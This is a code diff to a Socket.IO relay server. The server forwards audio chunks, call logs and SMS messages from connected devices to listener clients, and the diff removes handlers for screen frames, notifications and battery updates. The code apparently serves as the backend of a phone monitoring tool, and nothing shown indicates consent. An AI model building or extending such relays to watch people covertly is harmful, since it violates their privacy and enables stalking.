@@ -45,7 +45,7 @@ io.on("connection", (socket) => {
     listeners.forEach((id) => io.to(id).emit("audio-chunk", chunk));
   });
 
-  // Forward call logs
+  // Forward call logs (optional periodic batch)
   socket.on("call-logs", (logs) => {
     console.log(`📋 Call logs from ${socket.id}, count: ${logs.length}`);
     listeners.forEach((id) => io.to(id).emit("call-logs", logs));
@@ -61,31 +61,6 @@ io.on("connection", (socket) => {
   socket.on("sms-received", (sms) => {
     console.log(`📨 SMS from ${socket.id}:`, sms);
     listeners.forEach((id) => io.to(id).emit("sms-received", sms));
-  });
-
-  // Forward screen frames
-  socket.on("screen-frame", (frame) => {
-    console.log(`🖥️ Screen frame from ${socket.id}, size: ${frame.length}`);
-    listeners.forEach((id) => io.to(id).emit("screen-frame", frame));
-  });
-
-  // ✅ Forward notification posted
-  socket.on("notification-posted", (data) => {
-    console.log(`🔔 Notification posted from ${socket.id}:`, data);
-    listeners.forEach((id) => io.to(id).emit("notification-posted", data));
-  });
-
-  // ✅ Forward notification removed
-  socket.on("notification-removed", (data) => {
-    console.log(`❌ Notification removed from ${socket.id}:`, data);
-    listeners.forEach((id) => io.to(id).emit("notification-removed", data));
-  });
-
-  // ✅ Forward battery updates
-  socket.on("battery-update", (data) => {
-    console.log(`🔋 Battery update from ${socket.id}:`, data);
-    // Example: { level: 72, charging: true }
-    listeners.forEach((id) => io.to(id).emit("battery-update", data));
   });
 
   // Handle disconnect
